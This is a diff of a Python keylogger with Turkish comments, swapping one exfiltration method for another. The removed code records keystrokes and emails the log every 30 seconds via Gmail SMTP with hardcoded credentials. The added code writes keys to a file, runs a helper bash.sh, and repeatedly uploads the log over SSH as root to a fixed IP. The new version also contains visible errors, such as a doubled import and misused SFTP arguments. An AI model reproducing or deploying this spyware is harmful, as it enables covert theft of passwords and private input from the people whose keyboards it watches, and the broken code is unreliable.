@@ -1,38 +1,59 @@
-import pynput.keyboard #pynboard modülündeki keyboard modülünü yükledik
-import smtplib # smtplib modülünü yükleme mail modülü
-import threading # modül ekledik
+importimport paramiko
+import os
+import  time
+from pynput.keyboard import Key,Listener
 
-log = "" # log adına bir string oluşturduk 
+count=0
+keys=[]
 
-def callback_function(key): # klavyede basılan tuş hareketlerii  yollıcak
-    global log
-    try:
-        log = log + key.char.encode("utf-8") #türkçe karektere uyumlu olmak için utf8 kullandık
-        #log = log + str(key.char)
-    except AttributeError:#bu hata ile karşılaşırsan 
-        if key == key.space: # eğer space e baslıysa 
-            log = log + " " # boşluk bırak
-        else:
-            log = log + str(key) # keyleri stringe çevir 
-    print(log) # logu yazdır
+def on_press(key):
+    global keys,count
 
-def send_email(email,password,message): # email yollama
-    email_server = smtplib.SMTP("smtp.gmail.com",587) # hosta gmail kullandığımızı söyledik ve  gamilin portunu belirttik 
-    email_server.starttls()# starttls komutu siteyi açıyor
-    email_server.login(email,password)#bağlantı veriyor email ve şifreyle
-    email_server.sendmail(email,email,message)# emaili yolluyor 
-    email_server.quit()# maili kapadık
+    keys.append(key)
+    count += 1
+    print("".format(key))
 
-#thread - threading
+    if count >= 10:
+        count=0
+        write_file(keys)
+        keys=[]
 
-def thread_function(): #yeni fonksyion oluşturduk 
-    global log  # log stringini kullanmak için global ekledik 
-    send_email("blackouthacktesting@gmail.com", "testtest123456", log)  #gönderliecek email adresi
-    log = ""
-    timer_object = threading.Timer(30,thread_function)#timer objesi ouşturduk 30 saniyede bir mail göndericek
-    timer_object.start() # time objecti başlatıcak 
 
-keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)# bir paket geldiğinde bir fonksiyona o paketi işlemesi için yollar
-with keylogger_listener:
-    thread_function() # thread functionu çağırdık 
-    keylogger_listener.join() # keylogger listenerı başlatıyor 
+def write_file(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            k=str(key).replace("'" ,"")
+          #  if k.find(b"space")>0:
+           #     f.write('\n')
+            #elif k.find("Key")== -1:
+            f.write(k)
+
+def on_release(key):
+    if key==Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listenner:
+    listenner.join()
+
+os.system("chmod 777 bash.sh")
+os.system("./bash.sh") #gerekli dosyaları yükledfgf
+
+
+starttime = time.time()
+while True:
+
+
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    client.connect('192.168.138.128', username='root', password='root', key_filename='log.txt')
+
+    # Setup sftp connection and transmit this script
+    print("copying")
+
+    sftp = client.open_sftp()
+    sftp.put( "192.168.138.128", "/root/log.txt")
+
+
+    sftp.close()
+    time.sleep(1 - ((time.time() - starttime) % 10.0))
